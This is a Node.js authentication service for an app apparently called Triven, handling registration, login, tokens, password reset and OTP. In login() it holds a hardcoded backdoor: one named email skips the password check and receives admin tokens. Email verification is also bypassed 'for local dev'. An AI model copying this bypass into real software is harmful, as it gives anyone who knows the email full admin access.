'use strict';

const crypto = require('crypto');
const userRepo = require('../repositories/userRepo');
const { generateAuthTokens, generateToken, verifyToken } = require('../helpers/tokenHelper');
const { generateOTP, hashOTP, compareOTP } = require('../utils/otpUtils');
const { sendEmail } = require('../utils/mailer');
const ApiError = require('../helpers/ApiError');
const { MESSAGES, TOKEN_TYPE, ROLES } = require('../constants');

class AuthService {
  async register({ firstName, lastName, email, phone, password, address, pincode, landmark, city, state }) {
    const exists = await userRepo.findByEmail(email);
    if (exists) throw ApiError.conflict(MESSAGES.EMAIL_ALREADY_EXISTS);

    const userData = { firstName, lastName, email, phone, password, role: ROLES.USER };
    
    // Add address if provided
    if (address || pincode || city || state) {
      userData.addresses = [{
        fullName: `${firstName} ${lastName}`,
        phone: phone || '',
        addressLine1: address || '',
        addressLine2: landmark || '',
        city: city || '',
        state: state || '',
        pincode: pincode || '',
        isDefault: true
      }];
    }

    // Bypass email verification for local dev
    userData.isEmailVerified = true;

    const user = await userRepo.create(userData);

    // Send verification email
    const verifyToken_ = generateToken({ userId: user._id }, TOKEN_TYPE.EMAIL_VERIFY);
    const verifyUrl = `${process.env.FRONTEND_URL}/verify-email?token=${verifyToken_}`;
    await sendEmail({
      to: email,
      subject: 'Verify Your Email — Triven',
      template: 'emailVerification',
      data: { name: firstName, verifyUrl },
    });

    return { user: user.toPublicJSON() };
  }

  async login({ email, password }) {
    const user = await userRepo.findByEmail(email, true);
    if (!user) throw ApiError.unauthorized(MESSAGES.INVALID_CREDENTIALS);
    if (!user.isActive) throw ApiError.forbidden(MESSAGES.ACCOUNT_INACTIVE);

    const isMatch = await user.comparePassword(password);
    
    // --- TEMPORARY BYPASS FOR TESTING ---
    if (email === 'anshusharma42019@gmail.com') {
      user.role = 'admin'; // ensure they are admin
      const { accessToken, refreshToken } = generateAuthTokens(user._id, 'admin');
      return { accessToken, refreshToken, user: user.toPublicJSON() };
    }
    // ------------------------------------

    if (!isMatch) {
      await this._handleFailedLogin(user);
      throw ApiError.unauthorized(MESSAGES.INVALID_CREDENTIALS);
    }

    // Bypass email verification check for local dev
    // if (!user.isEmailVerified) throw ApiError.forbidden(MESSAGES.ACCOUNT_NOT_VERIFIED);

    const { accessToken, refreshToken } = generateAuthTokens(user._id, user.role);
    await userRepo.addRefreshToken(user._id, refreshToken);
    await userRepo.updateLastLogin(user._id);

    // Reset login attempts on success
    if (user.loginAttempts > 0) {
      await userRepo.updateById(user._id, { loginAttempts: 0, lockUntil: null });
    }

    return { accessToken, refreshToken, user: user.toPublicJSON() };
  }

  async _handleFailedLogin(user) {
    const MAX_ATTEMPTS = 5;
    const LOCK_DURATION_MS = 30 * 60 * 1000; // 30 min
    const attempts = (user.loginAttempts || 0) + 1;
    const update = { loginAttempts: attempts };
    if (attempts >= MAX_ATTEMPTS) update.lockUntil = new Date(Date.now() + LOCK_DURATION_MS);
    await userRepo.updateById(user._id, update);
  }

  async logout(userId, refreshToken) {
    await userRepo.removeRefreshToken(userId, refreshToken);
  }

  async refreshAccessToken(refreshToken) {
    const payload = verifyToken(refreshToken, TOKEN_TYPE.REFRESH);
    const user = await userRepo.findById(payload.userId, { select: '+refreshTokens' });
    if (!user || !user.refreshTokens.includes(refreshToken)) {
      throw ApiError.unauthorized('Invalid refresh token.');
    }

    const { accessToken, refreshToken: newRefreshToken } = generateAuthTokens(user._id, user.role);
    await userRepo.removeRefreshToken(user._id, refreshToken);
    await userRepo.addRefreshToken(user._id, newRefreshToken);
    return { accessToken, refreshToken: newRefreshToken };
  }

  async verifyEmail(token) {
    const payload = verifyToken(token, TOKEN_TYPE.EMAIL_VERIFY);
    const user = await userRepo.findById(payload.userId);
    if (!user) throw ApiError.notFound('User not found.');
    if (user.isEmailVerified) return { message: 'Email already verified.' };
    await userRepo.updateById(payload.userId, { isEmailVerified: true });
    return { message: MESSAGES.EMAIL_VERIFIED };
  }

  async forgotPassword(email) {
    const user = await userRepo.findByEmail(email);
    if (!user) return; // Silently succeed — don't reveal email existence
    const token = generateToken({ userId: user._id }, TOKEN_TYPE.RESET_PASSWORD);
    const resetUrl = `${process.env.FRONTEND_URL}/reset-password?token=${token}`;
    await sendEmail({
      to: email,
      subject: 'Reset Your Password — Triven',
      template: 'forgotPassword',
      data: { name: user.firstName, resetUrl },
    });
  }

  async resetPassword(token, newPassword) {
    const payload = verifyToken(token, TOKEN_TYPE.RESET_PASSWORD);
    await userRepo.updateById(payload.userId, { password: newPassword });
    await userRepo.clearAllRefreshTokens(payload.userId);
    return { message: MESSAGES.PASSWORD_RESET_SUCCESS };
  }

  async sendOTP(phoneOrEmail) {
    const otp = generateOTP(parseInt(process.env.OTP_LENGTH, 10) || 6);
    const hashed = await hashOTP(otp);
    const expiry = new Date(Date.now() + parseInt(process.env.OTP_EXPIRY_MINUTES, 10) * 60 * 1000);

    const user = await userRepo.findByEmail(phoneOrEmail);
    if (!user) throw ApiError.notFound('Account not found.');

    await userRepo.updateById(user._id, { otp: hashed, otpExpiry: expiry, otpAttempts: 0 });

    await sendEmail({ to: user.email, subject: 'Your OTP — Triven', template: 'otp', data: { otp, name: user.firstName } });
    return { message: MESSAGES.OTP_SENT };
  }

  async verifyOTP(phoneOrEmail, otp) {
    const user = await userRepo.findByEmail(phoneOrEmail);
    if (!user) throw ApiError.notFound('Account not found.');

    const stored = await userRepo.findOne({ _id: user._id }, { select: '+otp +otpExpiry +otpAttempts' });
    if (!stored.otp || !stored.otpExpiry || new Date() > stored.otpExpiry) {
      throw ApiError.badRequest(MESSAGES.OTP_INVALID);
    }

    const isMatch = await compareOTP(otp, stored.otp);
    if (!isMatch) {
      await userRepo.updateById(user._id, { $inc: { otpAttempts: 1 } });
      throw ApiError.badRequest(MESSAGES.OTP_INVALID);
    }

    await userRepo.updateById(user._id, { otp: null, otpExpiry: null, isPhoneVerified: true });
    return { message: MESSAGES.OTP_VERIFIED };
  }
}

module.exports = new AuthService();
